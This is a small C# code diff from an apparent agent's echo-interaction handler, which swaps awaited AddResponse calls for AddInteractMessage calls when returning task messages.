@@ -16,7 +16,7 @@ namespace Agent
 
         public async Task Execute(ServerJob job)
         {
-            await messageManager.AddResponse(new InteractMessage()
+            messageManager.AddInteractMessage(new InteractMessage()
             {
                 task_id = job.task.id,
                 data = Misc.Base64Encode("Ready to echo"),
@@ -26,7 +26,7 @@ namespace Agent
 
         public async void Interact(InteractMessage message)
         {
-            await messageManager.AddResponse(new InteractMessage()
+            messageManager.AddInteractMessage(new InteractMessage()
             {
                 task_id = message.task_id,
                 data = message.data,
